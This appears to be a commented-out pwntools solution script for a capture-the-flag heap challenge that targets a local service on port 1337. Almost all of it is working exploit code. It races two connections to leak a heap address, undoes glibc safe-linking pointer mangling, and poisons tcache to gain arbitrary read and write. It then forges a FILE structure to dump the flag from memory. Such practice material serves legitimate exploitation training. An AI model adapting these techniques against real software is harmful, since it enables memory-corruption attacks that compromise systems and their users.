# # idea: flag is still in the heap
# # directly write it it out will null part of the flag due to malloc (nullfying the `key` field)
# # try to fill flag_loc - 0x10 with "A"*16 then write

# from pwn import *
# import os
# import sys
# import time

# context.arch = 'amd64'
# context.log_level = 'error'
# libc = ELF("/challenge/lib/libc.so.6")

# def mangle(target:int, ptr:int, page_offset=0)->int:
#     return target ^ ((ptr >> 12) + page_offset)

# def demangle(raw:int, page_offset=0)->int:
#     pos = (raw >> 12) + page_offset
#     m = pos ^ raw
#     return m >> 24 ^ m

# def warmup_heap(r):
#     r.sendline(b'malloc 8')
#     r.sendline(b'malloc 9')
#     r.sendline(b'malloc 10')
#     r.sendline(b'free 10')
#     r.sendline(b'free 9')
#     r.sendline(b'free 8')

# def get_heap_leak(r1, r2):
#     r1.clean()
#     r2.clean()
#     pid = os.fork()
#     if pid == 0:
#         # child
#         for _ in range(10000):
#             r1.sendline(b'malloc 0 scanf 0 AAAAAAAA free 0')
#         sys.exit(0)
#     for _ in range(10000):
#         r2.sendline(b'printf 0')
#     os.wait()
#     raw = r2.clean()
#     for line in raw.splitlines():
#         if b'\x07' in line and b'\x00\x00\x00' in line:
#             leak = line.split(b'MESSAGE: ')[1]
#             print(f'mangled leak = {hex(unpack(leak, "all"))}')
#             #return demangle(unpack(leak, 'all'), page_offset=-1)
#             return unpack(leak, 'all')<<12

# idx = 1

# def controlled_allocation(r1, r2, addr):
#     global idx
#     r1.clean()
#     r2.clean()

#     r1.sendline(f"malloc {idx} malloc {idx+1} free {idx+1}")
#     while True:
#         pid = os.fork()
#         if pid == 0:
#             # child
#             r1.sendline(f"free {idx}")
#             sys.exit(0)
#         r2.send((f'scanf {idx} '.encode('utf-8') + p64(addr) + b'\n')*2000)
#         os.wait()

#         time.sleep(0.1)
#         # if we successfully overwrote *next of the top chunk in the bin
#         r1.sendline(f'malloc {idx} printf {idx}')
#         r1.recvuntil(b'MESSAGE: ')
#         result = r1.recvline()[:-1]
#         print(f'result = {result}; expected = {p64(addr)}')
#         if unpack(result, 'all') == addr:
#             break

#     r1.sendline(f'malloc {idx+1}')
#     r1.clean()
#     idx += 2

# def arb_read(r1, r2, addr):
#     # addr is already mangled
#     # 0x20 is bad byte for scanf
#     assert 0x20 not in set(p64(addr))

#     controlled_allocation(r1, r2, addr)
#     r1.sendline(f'printf {idx-1}')
#     r1.recvuntil(b'MESSAGE: ')
#     result = r1.recvline()[:-1]

#     return result

# def arb_write(r1, r2, addr, buf):
#     # addr is already mangled
#     # 0x20 is bad byte for scanf
#     assert 0x20 not in set(p64(addr))

#     controlled_allocation(r1, r2, addr)
#     r1.sendline(f'scanf {idx-1} '.encode('utf-8') + buf)

# #b *challenge+1022
# #p = gdb.debug("/challenge/babyprime_level8.0", gdbscript=
# #"""
# #continue
# #""")
# p = process("/challenge/babyprime_level10.1")
# time.sleep(1)

# r1 = remote("127.0.0.1", 1337)
# r2 = remote("127.0.0.1", 1337)
# #r3 = remote("127.0.0.1", 1337)
# #r4 = remote("127.0.0.1", 1337)
# #r5 = remote("127.0.0.1", 1337)
# #r6 = remote("127.0.0.1", 1337)

# #warmup_heap(r1)
# #warmup_heap(r2)
# #warmup_heap(r3)
# #warmup_heap(r4)

# heap_leak = get_heap_leak(r1, r2)
# #heap_leak = get_heap_leak(r3, r4)

# flag_loc = ((heap_leak>>20)<<20) + 0x1110
# fs = FileStructure()
# payload = fs.write(flag_loc, 100)
# mangled_addr = mangle(flag_loc-0x1110+0xd50, heap_leak)
# arb_write(r1, r2, mangled_addr, payload)

# r1.sendline(b"bullshit")
# print(r1.clean())

# #mangled_addr = mangle(flag_loc, heap_leak_)
# #flag = arb_read(r1, r2, mangled_addr)
# print(f'heap_leak = {hex(heap_leak)}')
# #print(f'heap_leak_2 = {hex(heap_leak_2)}')
# #print(f'heap_leak_3 = {hex(heap_leak_3)}')
# #print(f'flag = {flag}')
# #print(f"Exited: {p.poll()}")
# p.interactive()